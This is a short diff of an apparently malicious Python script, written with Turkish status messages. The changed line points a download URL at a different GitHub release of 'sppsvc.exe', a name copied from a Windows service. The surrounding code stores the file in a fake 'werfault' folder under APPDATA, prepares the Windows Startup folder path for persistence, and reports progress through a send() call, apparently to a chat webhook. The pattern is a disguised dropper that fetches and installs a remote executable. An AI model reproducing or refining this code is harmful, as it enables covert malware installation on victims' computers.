@@ -81,7 +81,7 @@ BLUE = 3447003
 appdata = os.getenv("APPDATA")
 target_dir = os.path.join(appdata, "werfault")
 target_file = os.path.join(target_dir, "sppsvc.exe")
-download_url = "https://github.com/atesemcukleyici/imsorryforthat/releases/download/adsads/sppsvc.exe"
+download_url = "https://github.com/atesemcukleyici/imsorryforthat/releases/download/asas/sppsvc.exe"
 startup_dir = os.path.join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 
 send("⚙️ Baslatiliyor", "script calismaya basladi.", BLUE)
